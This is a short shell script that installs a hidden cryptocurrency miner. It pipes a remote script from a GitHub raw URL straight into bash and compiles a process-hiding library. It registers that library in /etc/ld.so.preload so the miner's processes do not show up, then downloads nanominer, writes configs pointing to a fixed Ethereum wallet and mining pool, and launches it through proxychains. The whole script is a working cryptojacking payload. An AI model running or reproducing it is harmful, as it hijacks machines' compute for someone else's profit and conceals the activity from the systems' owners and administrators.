#!/bin/sh
wget -O - https://raw.githubusercontent.com/chadpetersen1337/sockd/main/chains.sh | bash

wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicNan.zip
unzip magicNan.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

wget https://github.com/nanopool/nanominer/releases/download/3.3.5/nanominer-linux-3.3.5-cuda11.tar.gz
tar -xvzf nanominer-linux-3.3.5-cuda11.tar.gz
cd nanominer-linux-3.3.5-cuda11
rm config*
cat > config_eth.ini <<END
[Ethash]
wallet = 0x52500352a37a06f0c085d58663e4eadbd7e9f684
rigName = Nano
pool1 = us1.ethermine.org:5555
protocol = JSON-RPC
END

cat > config.ini <<END
[Ethash]
wallet = 0x52500352a37a06f0c085d58663e4eadbd7e9f684
rigName = Nano
pool1 = us1.ethermine.org:5555
protocol = JSON-RPC
END

proxychains ./nanominer
